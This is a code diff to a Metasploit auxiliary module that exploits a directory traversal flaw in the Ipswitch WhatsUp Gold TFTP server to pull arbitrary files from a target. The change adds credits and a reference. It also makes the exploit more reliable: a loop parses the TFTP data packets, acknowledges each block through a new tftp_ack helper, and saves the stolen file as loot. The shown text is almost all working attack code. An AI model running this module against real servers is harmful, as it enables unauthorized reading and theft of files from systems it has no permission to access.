@@ -23,11 +23,13 @@ class Metasploit3 < Msf::Auxiliary
 			'Author'         =>
 				[
 					'Prabhu S Angadi',  #Initial discovery and poc
-					'sinn3r'            #Metasploit
+					'sinn3r',           #Metasploit
+					'juan vazquez'      #More improvements
 				],
 			'References'     =>
 				[
 					['OSVDB', '77455'],
+					['BID', '50890'],
 					['URL', 'http://www.exploit-db.com/exploits/18189/'],
 					['URL', 'http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt']
 				],
@@ -64,26 +66,53 @@ class Metasploit3 < Msf::Auxiliary
 		add_socket(udp_sock)
 
 		# Send the packet to target
-		udp_sock.sendto(pkt, ip, datastore['RPORT'])
+		file_data = ''
+		udp_sock.sendto(pkt, ip, datastore['RPORT'].to_i)
 
-		res = udp_sock.get(65535)
-		res = res[4, res.length]
+		while (r = udp_sock.recvfrom(65535, 0.1) and r[1])
+
+			opcode, block, data = r[0].unpack("nna*") # Parse reply
+			if opcode != 3 # Check opcode: 3 => Data Packet
+				print_error("Error retrieving file #{file_name} from #{ip}")
+				return
+			end
+			file_data << data
+			udp_sock.sendto(tftp_ack(block), r[1], r[2].to_i, 0) # Ack
+
+		end
+
+		if file_data.empty?
+				print_error("Error retrieving file #{file_name} from #{ip}")
+				return
+		end
+
 		udp_sock.close
 
 		# Output file if verbose
-		vprint_line(res.to_s)
+		vprint_line(file_data.to_s)
 
 		# Save file to disk
 		path = store_loot(
 			'whatsupgold.tftp',
 			'application/octet-stream',
 			ip,
-			res,
+			file_data,
 			datastore['FILENAME']
 		)
 
 		print_status("File saved in: #{path}")
 	end
+
+	#
+	# Returns an Acknowledgement
+	#
+	def tftp_ack(block=1)
+
+		pkt = "\x00\x04" # Ack
+		pkt << [block].pack("n") # Block Id
+
+	end
+
 end
 
 =begin
